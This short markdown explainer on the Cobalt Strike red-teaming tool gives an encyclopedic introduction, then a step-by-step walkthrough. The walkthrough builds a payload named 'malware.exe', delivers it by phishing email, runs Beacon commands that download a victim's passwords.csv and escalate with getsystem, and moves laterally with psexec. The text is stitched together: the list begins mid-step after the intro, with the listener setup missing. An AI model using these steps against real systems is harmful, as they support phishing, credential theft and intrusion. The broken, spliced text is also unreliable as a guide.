## About Cobalt Strike
Cobalt Strike is a commercial adversary simulation and red teaming tool designed to emulate the tactics, techniques, and procedures (TTPs) of advanced persistent threats (APTs). Developed by Raphael Mudge in 2012 and acquired by Fortra (formerly HelpSystems) in 2020, it is primarily used by security professionals for penetration testing and red team operations to assess organizational defenses. However, its robust capabilities have also made it a popular tool among cybercriminals when cracked or pirated versions are used. Cobalt Strike is known for its flexibility, extensive post-exploitation features, and ability to simulate sophisticated cyberattacks. It operates on a client-server model, with a team server managing connections and a client interface for operators to interact with compromised systems.[](https://www.cobaltstrike.com/)[](https://attack.mitre.org/software/S0154/)

   - Save and start the listener.
2. **Generate a Payload**:
   - Go to `Attacks -> Packages -> Windows Executable`.
   - Select `MyHTTPListener` and generate an executable (e.g., `malware.exe`).
3. **Deliver the Payload**:
   - Host the executable on a web server or send it via a phishing email.
4. **Interact with Beacon**:
   - Once the target executes the payload, a session appears in the client.
   - Right-click the session -> `Interact`.
   - Run commands like:
     ```bash
     whoami
     download C:\Users\victim\Documents\passwords.csv
     powerpick Get-Process
     browserpivot
     getsystem
     ```
5. **Lateral Movement**:
   - Use the `jump` command to move to another system:
     ```bash
     jump psexec_psh <target_ip> <listener>
     ```
6. **Clear Commands** (if needed):
   - Use `clear` to cancel queued commands in the Beacon console.[](https://trustedsec.com/blog/red-teaming-with-cobalt-strike-not-so-obvious-features)
